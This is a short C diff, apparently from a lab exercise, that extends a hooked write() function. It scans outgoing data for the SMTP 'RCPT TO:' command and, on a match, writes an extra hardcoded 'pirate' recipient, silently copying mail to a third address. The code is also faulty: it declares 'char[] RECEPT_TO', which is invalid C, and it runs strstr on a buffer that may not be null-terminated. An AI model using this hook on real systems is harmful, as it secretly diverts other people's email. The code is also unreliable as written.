@@ -11,6 +11,8 @@ static int (*real_puts)(const char* str) = NULL;
 /* wrapping write function call */
 ssize_t write(int fd, const void *buf, size_t count)
 {
+    char[] RECEPT_TO = "RCPT TO:";
+
     /* printing out the number of characters */
     printf("write:chars#:%lu\n", count);
     /* reslove the real write function from glibc
@@ -22,9 +24,11 @@ ssize_t write(int fd, const void *buf, size_t count)
 
     //TODO:
     //CHeck if buffer start with 'RCP TO:'
+    char* result = strstr(buf, RECEPT_TO);
+
 
     //If true:
-    //if (true)
+    if (result != NULL)
     {
         char RCPT_PIRATE[] = "RCPT TO: malik.fleury@he-arc.ch\n";
         //Write another RCPT_TO
